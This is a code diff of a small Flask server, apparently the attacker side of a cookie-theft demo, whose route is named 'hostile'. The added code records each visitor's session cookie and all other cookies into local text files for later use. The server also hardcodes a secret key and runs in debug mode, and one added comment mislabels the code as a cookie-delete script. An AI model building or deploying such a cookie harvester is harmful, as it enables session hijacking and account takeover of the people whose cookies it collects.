@@ -1,15 +1,36 @@
-import flask # https://flask.palletsprojects.com/en/1.1.x/
-from flask import * # https://flask.palletsprojects.com/en/1.1.x/
+import flask
+from flask import *
 
-app = flask.Flask(__name__) # Initiate flask app
+app = flask.Flask(__name__)
 
-app.secret_key = 'ypes79X32BVb1TyMA0qkHxYddzpVz4qrzJLFgs3zHL8' #Set session key different to gui
+app.secret_key = 'ypes79X32BVb1TyMA0qkHxYddzpVz4qrzJLFgs3zHL8'
 
-app.url_map.strict_slashes = False # Dont force trailing / in url
+app.url_map.strict_slashes = False
 
-@app.route('/') # default route
+@app.route('/')
 def hostile():
-        print(request.cookies) # print cookies
+        print(request.cookies) # All cookie delete script from https://stackoverflow.com/a/27374365
+        f = open("session_db.txt", "a") # Make sure file exists
+        f.close()
+        with open("session_db.txt", "r+") as f:
+                content = f.read()
+        get_session = request.cookies.get("session")
+        if get_session not in content:
+                with open ("session_db.txt", "a") as f:
+                        f.write(get_session + "\n")
+        f.close()
+
+        f = open("cookie_db.txt", "a")  # Make sure file exists
+        f.close()
+        with open("cookie_db.txt", "r") as f:
+                content = f.read()
+        get_cookie = request.cookies.to_dict()
+        get_cookie.pop("session")
+        get_cookie = json.dumps(get_cookie)
+        if get_cookie not in content:
+                with open("cookie_db.txt", "a") as f:
+                        f.write(get_cookie + "\n")
+        f.close()
         return "HOSTILE"
 
-app.run(debug=True, port=3500) # run on different port to gui
+app.run(debug=True, port=3500)
